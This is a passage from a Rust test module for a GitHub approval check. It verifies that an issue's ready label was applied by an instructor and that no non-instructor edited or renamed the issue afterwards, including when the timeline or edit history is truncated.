            "editor": last.map_or(Value::Null, |(_, who)| actor_of(who)),
            "userContentEdits": edits_json(edit_nodes, total_edits),
        }}}})
        .to_string()
    }

    /// `events` are oldest first, as GitHub lists them. `edits` is the history oldest first.
    fn approval_reply(
        events: &[Value],
        total_events: usize,
        last: Option<Edit>,
        edits: &[Edit],
    ) -> String {
        approval_reply_raw(
            events,
            total_events,
            last,
            &newest_first(edits),
            edits.len(),
        )
    }

    /// The events as the tests think of them, with the real total.
    fn events_reply(events: &[Value], last: Option<Edit>, edits: &[Edit]) -> String {
        approval_reply(events, events.len(), last, edits)
    }

    fn creation_only(author: &str) -> Vec<Edit<'_>> {
        vec![e(CREATED, author)]
    }

    fn approval_call_for(issue: u64) -> Vec<String> {
        args(&[
            "api",
            "graphql",
            "-f",
            &format!("query={APPROVAL_QUERY}"),
            "-f",
            "owner=rawphp",
            "-f",
            "name=softfac",
            "-F",
            &format!("number={issue}"),
        ])
    }

    fn approval_call() -> Vec<String> {
        approval_call_for(6)
    }

    fn approval_of(answer: &str, who: &[&str]) -> Approval {
        let fake = FakeTracker::answering([Answer::ok(answer)]);
        let found = fake.approval(REPO, 6, &names(who)).unwrap();
        assert_eq!(fake.calls(), vec![approval_call()]);
        found
    }

    fn approved(labeled_at: &str, labeled_by: &str) -> Approval {
        Approval::Approved {
            labeled_at: labeled_at.into(),
            labeled_by: labeled_by.into(),
        }
    }

    fn refused(refusal: Refusal) -> Approval {
        Approval::Refused(refusal)
    }

    fn edited_after(labeled_at: &str) -> Refusal {
        Refusal::EditedAfterLabel {
            labeled_at: labeled_at.into(),
        }
    }

    fn history_cut(labeled_at: &str) -> Refusal {
        Refusal::EditHistoryIncomplete {
            labeled_at: labeled_at.into(),
        }
    }

    fn by_non_instructor(by: Option<&str>, labeled_at: &str) -> Refusal {
        Refusal::LabeledByNonInstructor {
            by: by.map(String::from),
            labeled_at: labeled_at.into(),
        }
    }

    // ---- approvalHistory.ts: the pure half ----

    fn user(login: &str) -> Actor {
        Actor {
            typename: Some("User".into()),
            login: login.into(),
        }
    }

    fn labeled(at: &str, login: &str, name: &str) -> TimelineNode {
        TimelineNode::LabeledEvent(LabelChange {
            created_at: at.into(),
            actor: Some(user(login)),
            label: LabelName { name: name.into() },
        })
    }

    fn unlabeled(at: &str, login: &str) -> TimelineNode {
        TimelineNode::UnlabeledEvent(LabelChange {
            created_at: at.into(),
            actor: Some(user(login)),
            label: LabelName { name: READY.into() },
        })
    }

    fn renamed(at: &str, login: &str) -> TimelineNode {
        TimelineNode::RenamedTitleEvent(Rename {
            created_at: at.into(),
            actor: Some(user(login)),
        })
    }

    /// An answer with these events (oldest first) and body edits (newest first), totals as
    /// given.
    fn issue_of(
        events: Vec<TimelineNode>,
        edits: &[(&str, &str)],
        events_total: Option<u64>,
        edits_total: Option<u64>,
    ) -> ApprovalIssue {
        ApprovalIssue {
            timeline_items: Timeline {
                total_count: events_total.unwrap_or(events.len() as u64),
                nodes: events,
            },
            last_edited_at: edits.first().map(|(at, _)| at.to_string()),
            editor: edits.first().map(|(_, login)| user(login)),
            user_content_edits: EditHistory {
                total_count: edits_total.unwrap_or(edits.len() as u64),
                nodes: edits
                    .iter()
                    .map(|(at, login)| EditEntry {
                        edited_at: at.to_string(),
                        editor: Some(user(login)),
                    })
                    .collect(),
            },
        }
    }

    #[test]
    fn the_approval_query_asks_for_label_events_and_the_edit_history() {
        for part in [
            "timelineItems(itemTypes: [LABELED_EVENT, UNLABELED_EVENT, RENAMED_TITLE_EVENT], last: 100)",
            "totalCount",
            "... on LabeledEvent { createdAt actor { __typename login } label { name } }",
            "... on UnlabeledEvent { createdAt actor { __typename login } label { name } }",
            "... on RenamedTitleEvent { createdAt actor { __typename login } }",
            "lastEditedAt",
            "editor { __typename login }",
            "userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } }",
            "$owner",
            "$name",
            "$number",
        ] {
            assert!(APPROVAL_QUERY.contains(part), "missing {part}");
        }
        assert!(!APPROVAL_QUERY.contains("comments"));
        // Titles are attacker-influenced text and are never asked for.
        assert!(!APPROVAL_QUERY.contains("Title {"));
        assert!(!APPROVAL_QUERY.contains("currentTitle"));
        assert!(!APPROVAL_QUERY.contains("previousTitle"));
    }

    #[test]
    fn the_approval_query_is_softfacs_byte_for_byte() {
        assert_eq!(
            APPROVAL_QUERY,
            "query($owner: String!, $name: String!, $number: Int!) { repository(owner: $owner, name: $name) { issue(number: $number) { timelineItems(itemTypes: [LABELED_EVENT, UNLABELED_EVENT, RENAMED_TITLE_EVENT], last: 100) { totalCount nodes { __typename ... on LabeledEvent { createdAt actor { __typename login } label { name } } ... on UnlabeledEvent { createdAt actor { __typename login } label { name } } ... on RenamedTitleEvent { createdAt actor { __typename login } } } } lastEditedAt editor { __typename login } userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } } } } }"
        );
    }

    #[test]
    fn judge_approval_approves_the_label_in_force_applied_by_an_instructor() {
        let issue = issue_of(vec![labeled(LABELED, "Tom", READY)], &[], None, None);
        assert_eq!(
            judge_approval(&issue, READY, &names(&["tom"])),
            approved(LABELED, "Tom")
        );
    }

    #[test]
    fn judge_approval_finds_no_label_when_a_later_removal_cancelled_it_or_the_name_differs() {
        let not_found = refused(Refusal::LabelNotFound);
        let removed = issue_of(
            vec![labeled(LABELED, "tom", READY), unlabeled(AFTER, "tom")],
            &[],
            None,
            None,
        );
        assert_eq!(judge_approval(&removed, READY, &names(&["tom"])), not_found);
        let other = issue_of(
            vec![labeled(LABELED, "tom", "Factory:Ready")],
            &[],
            None,
            None,
        );
        assert_eq!(judge_approval(&other, READY, &names(&["tom"])), not_found);
    }

    #[test]
    fn judge_approval_says_a_full_page_of_a_longer_history_without_the_label_is_incomplete() {
        let page: Vec<TimelineNode> = (0..HISTORY_PAGE).map(|_| renamed(BEFORE, "tom")).collect();
        assert_eq!(
            judge_approval(
                &issue_of(page.clone(), &[], Some(HISTORY_PAGE as u64 + 1), None),
                READY,
                &names(&["tom"])
            ),
            refused(Refusal::LabelHistoryIncomplete)
        );
        assert_eq!(
            judge_approval(&issue_of(page, &[], None, None), READY, &names(&["tom"])),
            refused(Refusal::LabelNotFound)
        );
    }

    #[test]
    fn judge_approval_refuses_a_label_applied_by_someone_who_is_not_an_instructor() {
        assert_eq!(
            judge_approval(
                &issue_of(vec![labeled(LABELED, "eve", READY)], &[], None, None),
                READY,
                &names(&["tom"])
            ),
            refused(by_non_instructor(Some("eve"), LABELED))
        );
        let app = LabelChange {
            created_at: LABELED.into(),
            actor: Some(Actor {
                typename: Some("Bot".into()),
                login: "tom".into(),
            }),
            label: LabelName { name: READY.into() },
        };
        assert_eq!(
            judge_approval(
                &issue_of(
                    vec![TimelineNode::LabeledEvent(app.clone())],
                    &[],
                    None,
                    None
                ),
                READY,
                &names(&["tom"])
            ),
            refused(by_non_instructor(Some("tom"), LABELED))
        );
        let deleted = LabelChange { actor: None, ..app };
        assert_eq!(
            judge_approval(
                &issue_of(vec![TimelineNode::LabeledEvent(deleted)], &[], None, None),
                READY,
                &names(&["tom"])
            ),
            refused(by_non_instructor(None, LABELED))
        );
    }

    #[test]
    fn judge_approval_refuses_a_strangers_edit_or_rename_at_or_after_the_label_not_before() {
        let edited = refused(edited_after(LABELED));
        let tom = names(&["tom"]);
        let edit_after = issue_of(
            vec![labeled(LABELED, "tom", READY)],
            &[(LABELED, "eve")],
            None,
            None,
        );
        assert_eq!(judge_approval(&edit_after, READY, &tom), edited);
        let rename_after = issue_of(
            vec![labeled(LABELED, "tom", READY), renamed(AFTER, "eve")],
            &[],
            None,
            None,
        );
        assert_eq!(judge_approval(&rename_after, READY, &tom), edited);
        let before = issue_of(
            vec![renamed(BEFORE, "eve"), labeled(LABELED, "tom", READY)],
            &[(BEFORE, "eve")],
            None,
            None,
        );
        assert!(matches!(
            judge_approval(&before, READY, &tom),
            Approval::Approved { .. }
        ));
        let instructor = issue_of(
            vec![labeled(LABELED, "tom", READY), renamed(AFTER, "tom")],
            &[(AFTER, "tom")],
            None,
            None,
        );
        assert!(matches!(
            judge_approval(&instructor, READY, &tom),
            Approval::Approved { .. }
        ));
    }

    #[test]
    fn judge_approval_refuses_an_edit_history_cut_off_after_the_label() {
        let edits: Vec<(&str, &str)> = (0..HISTORY_PAGE).map(|_| (AFTER, "tom")).collect();
        assert_eq!(
            judge_approval(
                &issue_of(vec![labeled(LABELED, "tom", READY)], &edits, None, None),
                READY,
                &names(&["tom"])
            ),
            refused(history_cut(LABELED))
        );
    }

    #[test]
    fn edited_since_counts_anyones_edit_or_rename_at_or_after_the_moment() {
        assert!(!edited_since(
            &issue_of(vec![renamed(BEFORE, "tom")], &[(BEFORE, "tom")], None, None),
            LABELED
        ));
        assert!(edited_since(
            &issue_of(vec![], &[(LABELED, "tom")], None, None),
            LABELED
        ));
        assert!(edited_since(
            &issue_of(vec![renamed(AFTER, "tom")], &[], None, None),
            LABELED
        ));
    }

    #[test]
    fn edited_since_counts_a_timeline_page_that_may_hide_a_rename_as_a_change() {
        let page: Vec<TimelineNode> = (0..HISTORY_PAGE)
            .map(|_| labeled(AFTER, "tom", "other"))
            .collect();
        assert!(edited_since(
            &issue_of(page.clone(), &[], None, None),
            LABELED
        ));
        let mut reaches_back = vec![labeled(BEFORE, "tom", "other")];
        reaches_back.extend(page.into_iter().skip(1));
        assert!(!edited_since(
            &issue_of(reaches_back, &[], None, None),
            LABELED
        ));
    }

    // ---- approval ----

    #[test]
    fn approval_reads_the_real_shapes_and_sends_one_call() {
        let real = r#"{"data":{"repository":{"issue":{"timelineItems":{"totalCount":3,"nodes":[{"__typename":"UnlabeledEvent","createdAt":"2026-10-04T11:36:21Z","actor":{"__typename":"User","login":"rawphp"},"label":{"name":"factory:building"}},{"__typename":"LabeledEvent","createdAt":"2026-10-04T11:36:21Z","actor":{"__typename":"User","login":"rawphp"},"label":{"name":"factory:ready"}},{"__typename":"RenamedTitleEvent","createdAt":"2026-10-04T11:48:55Z","actor":{"__typename":"User","login":"rawphp"}}]},"lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":1,"nodes":[{"editedAt":"2026-10-04T09:50:06Z","editor":{"__typename":"User","login":"outside-user"}}]}}}}}"#;
        assert_eq!(
            approval_of(real, &["rawphp"]),
            approved("2026-10-04T11:36:21Z", "rawphp")
        );
    }

    #[test]
    fn an_outside_authors_unedited_report_labelled_by_an_instructor_is_approved() {
        // The creation entry is by the author, before the label, and is ignored.
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            None,
            &creation_only("outsider"),
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn an_issue_with_no_history_at_all_is_approved_when_an_instructor_labelled_it() {
        let answer = events_reply(&[ready_on(LABELED, "tom")], None, &[]);
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn the_instructor_comparison_ignores_case() {
        let answer = events_reply(
            &[ready_on(LABELED, "TomK")],
            Some(e(AFTER, "TOMK")),
            &[e(CREATED, "outsider"), e(AFTER, "TOMK")],
        );
        assert_eq!(approval_of(&answer, &["tomk"]), approved(LABELED, "TomK"));
    }

    #[test]
    fn other_labels_in_the_events_are_ignored() {
        let answer = events_reply(
            &[
                label_event("LabeledEvent", "2026-10-04T09:00:00Z", "eve", "bug"),
                ready_on(LABELED, "tom"),
                label_event("UnlabeledEvent", AFTER, "eve", "bug"),
                label_event("LabeledEvent", AFTER, "eve", "factory:readyish"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn a_label_applied_removed_and_applied_again_by_an_instructor_counts_the_later_event() {
        // A non-instructor applied it first and an instructor reviewed and re-applied it.
        let answer = events_reply(
            &[
                ready_on("2026-10-04T09:00:00Z", "eve"),
                ready_off("2026-10-04T09:30:00Z", "tom"),
                ready_on(LABELED, "tom"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn a_label_applied_by_an_instructor_then_reapplied_by_a_non_instructor_is_refused() {
        let answer = events_reply(
            &[
                ready_on("2026-10-04T09:00:00Z", "tom"),
                ready_off("2026-10-04T09:30:00Z", "tom"),
                ready_on(LABELED, "eve"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(by_non_instructor(Some("eve"), LABELED))
        );
    }

    #[test]
    fn a_label_applied_by_a_non_instructor_is_refused() {
        let answer = events_reply(&[ready_on(LABELED, "eve")], None, &creation_only("eve"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(by_non_instructor(Some("eve"), LABELED))
        );
    }

    #[test]
    fn a_label_applied_by_a_deleted_account_is_refused() {
        let answer = events_reply(&[ready_on(LABELED, NOBODY)], None, &creation_only("tom"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(by_non_instructor(None, LABELED))
        );
    }

    #[test]
    fn a_label_that_was_removed_and_not_applied_again_is_not_found() {
        let answer = events_reply(
            &[
                ready_on("2026-10-04T09:00:00Z", "tom"),
                ready_off(LABELED, "tom"),
            ],
            None,
            &creation_only("tom"),
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(Refusal::LabelNotFound)
        );
    }

    #[test]
    fn no_label_events_at_all_is_not_found() {
        let answer = events_reply(&[], None, &creation_only("tom"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(Refusal::LabelNotFound)
        );
    }

    /// `n` events about another label, oldest first.
    fn noise(n: usize) -> Vec<Value> {
        (0..n)
            .map(|i| {
                label_event(
                    if i % 2 == 0 {
                        "LabeledEvent"
                    } else {
                        "UnlabeledEvent"
                    },
                    "2026-10-04T09:00:00Z",
                    "tom",
                    "bug",
                )
            })
            .collect()
    }

    #[test]
    fn a_hundred_events_of_a_longer_history_without_the_label_is_incomplete() {
        let answer = approval_reply(&noise(100), 150, None, &creation_only("tom"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(Refusal::LabelHistoryIncomplete)
        );
    }

    #[test]
    fn a_label_found_among_the_newest_hundred_is_enough_whatever_the_total() {
        let mut events = noise(99);
        events.push(ready_on(LABELED, "tom"));
        let answer = approval_reply(&events, 400, None, &creation_only("tom"));
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn a_removal_among_the_newest_hundred_is_not_a_missing_history() {
        // The label was taken off in view: the history is not why it is missing.
        let mut events = vec![ready_on("2026-10-04T08:30:00Z", "tom")];
        events.extend(noise(98));
        events.push(ready_off(LABELED, "tom"));
        let answer = approval_reply(&events, 100, None, &creation_only("tom"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(Refusal::LabelNotFound)
        );
    }

    #[test]
    fn a_complete_hundred_or_a_short_page_without_the_label_is_only_not_found() {
        // Exactly 100 in all: nothing is hidden.
        let whole = approval_reply(&noise(100), 100, None, &creation_only("tom"));
        assert_eq!(
            approval_of(&whole, &["tom"]),
            refused(Refusal::LabelNotFound)
        );
        // A page short of 100 is not the cut-off that rule is about.
        let short = approval_reply(&noise(99), 120, None, &creation_only("tom"));
        assert_eq!(
            approval_of(&short, &["tom"]),
            refused(Refusal::LabelNotFound)
        );
    }

    #[test]
    fn an_instructor_edit_after_the_label_is_approved() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(AFTER, "amy")),
            &[e(CREATED, "eve"), e(AFTER, "amy")],
        );
        assert_eq!(
            approval_of(&answer, &["tom", "amy"]),
            approved(LABELED, "tom")
        );
    }

    #[test]
    fn a_non_instructor_edit_after_the_label_is_refused() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(AFTER, "eve")),
            &[e(CREATED, "eve"), e(AFTER, "eve")],
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn a_non_instructor_edit_followed_by_an_instructor_edit_is_refused() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(LATER, "tom")),
            &[e(CREATED, "eve"), e(AFTER, "eve"), e(LATER, "tom")],
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn an_edit_by_a_deleted_account_after_the_label_is_refused() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(AFTER, NOBODY)),
            &[e(CREATED, "eve"), e(AFTER, NOBODY)],
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn edits_before_the_label_are_ignored_whoever_made_them() {
        // The instructor approved the text as it stood when they applied the label.
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e("2026-10-04T09:30:00Z", "eve")),
            &[
                e(CREATED, "eve"),
                e("2026-10-04T09:00:00Z", NOBODY),
                e("2026-10-04T09:30:00Z", "eve"),
            ],
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn an_edit_in_the_same_second_as_the_label_counts_as_after_it() {
        let stranger = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(LABELED, "eve")),
            &[e(CREATED, "eve"), e(LABELED, "eve")],
        );
        assert_eq!(
            approval_of(&stranger, &["tom"]),
            refused(edited_after(LABELED))
        );
        // An instructor's edit in that second is fine, and one second earlier is before it.
        let instructor = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(LABELED, "tom")),
            &[e(CREATED, "eve"), e(LABELED, "tom")],
        );
        assert_eq!(approval_of(&instructor, &["tom"]), approved(LABELED, "tom"));
        let before = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e("2026-10-04T09:59:59Z", "eve")),
            &[e(CREATED, "eve"), e("2026-10-04T09:59:59Z", "eve")],
        );
        assert_eq!(approval_of(&before, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn only_the_label_that_is_in_force_sets_the_cut_off_for_edits() {
        // An edit between an old, removed label and the label now in force is before it.
        let answer = events_reply(
            &[
                ready_on("2026-10-04T09:00:00Z", "tom"),
                ready_off("2026-10-04T09:10:00Z", "tom"),
                ready_on(LABELED, "tom"),
            ],
            Some(e("2026-10-04T09:30:00Z", "eve")),
            &[e(CREATED, "eve"), e("2026-10-04T09:30:00Z", "eve")],
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    /// `n` seconds, one apart, from 10:01:00.
    fn seconds_after_label(n: usize) -> Vec<String> {
        (0..n)
            .map(|i| format!("2026-10-04T10:{}:{}Z", pad(1 + i / 60), pad(i % 60)))
            .collect()
    }

    #[test]
    fn a_full_page_of_edits_is_an_incomplete_history() {
        let times = seconds_after_label(100);
        let history = |n: usize| -> Vec<Edit> { times[..n].iter().map(|t| e(t, "tom")).collect() };
        let last = |n: usize| -> Option<Edit> { Some(e(&times[n - 1], "tom")) };
        let events = || vec![ready_on(LABELED, "tom")];
        assert_eq!(
            approval_of(&events_reply(&events(), last(99), &history(99)), &["tom"]),
            approved(LABELED, "tom")
        );
        assert_eq!(
            approval_of(&events_reply(&events(), last(100), &history(100)), &["tom"]),
            refused(history_cut(LABELED))
        );
    }

    #[test]
    fn an_edit_total_above_the_page_is_an_incomplete_history_when_the_label_may_be_hidden() {
        // Both shown entries are after the label, so older ones could be too.
        let nodes = [e(LATER, "tom"), e(AFTER, "tom")];
        let last = Some(e(LATER, "tom"));
        let run = |total: usize| {
            approval_of(
                &approval_reply_raw(&[ready_on(LABELED, "tom")], 1, last, &nodes, total),
                &["tom"],
            )
        };
        assert_eq!(run(2), approved(LABELED, "tom"));
        assert_eq!(run(5), refused(history_cut(LABELED)));
    }

    #[test]
    fn the_newest_edit_entry_must_be_the_last_edit() {
        let create = e(CREATED, "tom");
        let last = Some(e(AFTER, "tom"));
        let run = |nodes: &[Edit]| {
            approval_of(
                &approval_reply_raw(&[ready_on(LABELED, "tom")], 1, last, nodes, nodes.len()),
                &["tom", "amy"],
            )
        };
        assert_eq!(run(&[e(AFTER, "tom"), create]), approved(LABELED, "tom"));
        // Another time, another editor (both instructors), or no entry for it.
        let wrong: [&[Edit]; 4] = [
            &[e("2026-10-04T10:20:00Z", "tom"), create],
            &[e(AFTER, "amy"), create],
            &[create],
            &[],
        ];
        for nodes in wrong {
            assert_eq!(run(nodes), refused(history_cut(LABELED)));
        }
    }

    #[test]
    fn a_visible_stranger_edit_is_named_even_when_the_history_is_also_cut_off() {
        let nodes = [e(AFTER, "eve"), e(CREATED, "tom")];
        let answer = approval_reply_raw(
            &[ready_on(LABELED, "tom")],
            1,
            Some(e(AFTER, "eve")),
            &nodes,
            9,
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn the_label_is_judged_before_the_edits() {
        let answer = events_reply(
            &[ready_on(LABELED, "eve")],
            Some(e(AFTER, "eve")),
            &[e(CREATED, "eve"), e(AFTER, "eve")],
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(by_non_instructor(Some("eve"), LABELED))
        );
    }

    #[test]
    fn approval_with_no_instructors_approves_nothing() {
        let answer = events_reply(&[ready_on(LABELED, "tom")], None, &creation_only("tom"));
        assert_eq!(
            approval_of(&answer, &[]),
            refused(by_non_instructor(Some("tom"), LABELED))
        );
    }

    /// The error `approval` gives for this answer, or none when it reads it.
    fn approval_error(answer: &str) -> Option<TrackerError> {
        let fake = FakeTracker::answering([Answer::ok(answer)]);
        fake.approval(REPO, 6, &names(&["tom"])).err()
    }

    /// Whether `error` is a parse error that names the call with `call`.
    fn is_parse_error_of(error: Option<TrackerError>, call: &[String]) -> bool {
        match error {
            Some(TrackerError::Other(message)) => message.starts_with(&format!(
                "`{}` returned unexpected output",
                command_text(call)
            )),
            _ => false,
        }
    }

    /// Whether `answer` is a parse error that names the approval call.
    fn is_approval_parse_error(answer: &str) -> bool {
        is_parse_error_of(approval_error(answer), &approval_call())
    }

    #[test]
    fn approval_answers_that_cannot_be_read_are_parse_errors() {
        let good = |events: Value, edits: Value| {
            json!({"data": {"repository": {"issue": {
                "timelineItems": {"totalCount": 1, "nodes": events},
                "lastEditedAt": null,
                "editor": null,
                "userContentEdits": edits,
            }}}})
            .to_string()
        };
        let edits = edits_json(&[e(CREATED, "tom")], 1);
        // The control: this one is fine.
        assert!(!is_approval_parse_error(&good(
            json!([ready_on(LABELED, "tom")]),
            edits.clone()
        )));

        for bad in [
            "not json",
            "",
            "{}",
            r#"{"data":{"repository":null}}"#,
            r#"{"errors":[{"message":"x"}]}"#,
            // No label events, no edit history, no total counts.
            r#"{"data":{"repository":{"issue":{"lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":0,"nodes":[]}}}}}"#,
            r#"{"data":{"repository":{"issue":{"timelineItems":{"totalCount":0,"nodes":[]},"lastEditedAt":null,"editor":null}}}}"#,
            r#"{"data":{"repository":{"issue":{"timelineItems":{"nodes":[]},"lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":0,"nodes":[]}}}}}"#,
        ] {
            assert!(is_approval_parse_error(bad), "{bad}");
        }
        // A node missing its time, its label, or its type, or of a type we did not ask for.
        for broken in [
            json!({"__typename": "LabeledEvent", "actor": {"login": "tom"}, "label": {"name": "factory:ready"}}),
            json!({"__typename": "LabeledEvent", "createdAt": LABELED, "actor": {"login": "tom"}}),
            json!({"createdAt": LABELED, "actor": {"login": "tom"}, "label": {"name": "factory:ready"}}),
            json!({"__typename": "ClosedEvent", "createdAt": LABELED}),
        ] {
            assert!(
                is_approval_parse_error(&good(json!([broken.clone()]), edits.clone())),
                "{broken}"
            );
        }
    }

    #[test]
    fn a_malformed_timestamp_is_a_parse_error() {
        for at in [
            "2026-10-04 10:00:00Z",
            "2026-10-04T10:00:00",
            "",
            "yesterday",
        ] {
            // In the label event.
            let in_label = events_reply(&[ready_on(at, "tom")], None, &creation_only("tom"));
            assert!(is_approval_parse_error(&in_label), "label at {at}");
            // In the edit history.
            let in_edit = events_reply(
                &[ready_on(LABELED, "tom")],
                Some(e(AFTER, "tom")),
                &[e(CREATED, "tom"), e(at, "tom")],
            );
            assert!(is_approval_parse_error(&in_edit), "edit at {at}");
            // In lastEditedAt.
            let in_last = events_reply(
                &[ready_on(LABELED, "tom")],
                Some(e(at, "tom")),
                &[e(CREATED, "tom"), e(at, "tom")],
            );
            assert!(is_approval_parse_error(&in_last), "last edit at {at}");
            let in_rename = events_reply(
                &[ready_on(LABELED, "tom"), rename_event(at, "tom")],
                None,
                &creation_only("tom"),
            );
            assert!(is_approval_parse_error(&in_rename), "rename at {at}");
        }
    }

    #[test]
    fn approval_failures_from_gh_are_errors_with_the_call() {
        let failed = FakeTracker::answering([Answer::fail(1, "HTTP 502")]);
        let error = failed.approval(REPO, 6, &names(&["tom"])).unwrap_err();
        assert_eq!(
            error,
            TrackerError::Other(format!(
                "`{}` exited with status 1: HTTP 502",
                command_text(&approval_call())
            ))
        );

        let spawn = FakeTracker::answering([Answer::NotStarted("no such file".into())]);
        let error = spawn.approval(REPO, 6, &names(&["tom"])).unwrap_err();
        assert_eq!(
            error,
            TrackerError::Other(format!(
                "cannot start `{}`: no such file",
                command_text(&approval_call())
            ))
        );
    }

    /// `n` instructor renames after the label, oldest first, one second apart.
    fn renames_after_label(n: usize) -> Vec<Value> {
        seconds_after_label(n)
            .iter()
            .map(|at| rename_event(at, "tom"))
            .collect()
    }

    #[test]
    fn a_title_renamed_by_a_non_instructor_after_the_label_is_refused() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(AFTER, "eve")],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn a_title_renamed_by_an_instructor_after_the_label_is_approved() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(AFTER, "AMY")],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&answer, &["tom", "amy"]),
            approved(LABELED, "tom")
        );
    }

    #[test]
    fn a_rename_by_a_deleted_account_after_the_label_is_refused() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(AFTER, NOBODY)],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn a_stranger_rename_followed_by_an_instructor_rename_is_refused() {
        let answer = events_reply(
            &[
                ready_on(LABELED, "tom"),
                rename_event(AFTER, "eve"),
                rename_event(LATER, "tom"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn a_stranger_rename_is_refused_even_when_every_body_edit_is_an_instructors() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(LATER, "eve")],
            Some(e(AFTER, "tom")),
            &[e(CREATED, "eve"), e(AFTER, "tom")],
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn renames_before_the_label_in_force_are_ignored() {
        // Before the label, and between a removed label and the one in force.
        let answer = events_reply(
            &[
                rename_event("2026-10-04T08:30:00Z", "eve"),
                ready_on("2026-10-04T09:00:00Z", "tom"),
                ready_off("2026-10-04T09:10:00Z", "tom"),
                rename_event("2026-10-04T09:30:00Z", NOBODY),
                ready_on(LABELED, "tom"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn a_rename_in_the_same_second_as_the_label_counts_as_after_it() {
        let stranger = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(LABELED, "eve")],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&stranger, &["tom"]),
            refused(edited_after(LABELED))
        );
        let instructor = events_reply(
            &[
                rename_event("2026-10-04T09:59:59Z", "eve"),
                ready_on(LABELED, "tom"),
                rename_event(LABELED, "tom"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(approval_of(&instructor, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn labels_and_renames_share_the_page_and_the_label_in_force_is_enough() {
        // The label is the oldest event shown, so every later event, the renames included, is
        // on the page: events come oldest first and the page is the newest 100. Nothing before
        // the label matters, whatever the total.
        let mut events = vec![ready_on(LABELED, "tom")];
        events.extend(renames_after_label(99));
        let answer = approval_reply(&events, 400, None, &creation_only("eve"));
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));

        // A stranger's rename on that page is seen.
        let mut with_stranger = events.clone();
        with_stranger[50] = rename_event("2026-10-04T10:20:00Z", "eve");
        let seen = approval_reply(&with_stranger, 400, None, &creation_only("eve"));
        assert_eq!(approval_of(&seen, &["tom"]), refused(edited_after(LABELED)));
    }

    #[test]
    fn a_page_of_renames_without_the_label_is_a_missing_label_history_not_a_stranger_edit() {
        // The label is older than all 100 shown events. Nothing shown can be told to be after it.
        let events: Vec<Value> = (0..100).map(|_| rename_event(AFTER, "eve")).collect();
        let answer = approval_reply(&events, 150, None, &creation_only("eve"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(Refusal::LabelHistoryIncomplete)
        );
    }

    /// `n` seconds, one apart, from `hour`:00:00.
    fn edit_times(hour: usize, n: usize) -> Vec<String> {
        (0..n)
            .map(|i| format!("2026-10-04T{}:{}:{}Z", pad(hour), pad(i / 60), pad(i % 60)))
            .collect()
    }

    #[test]
    fn a_hundred_edits_with_the_oldest_shown_before_the_label_are_judged_by_the_visible_ones() {
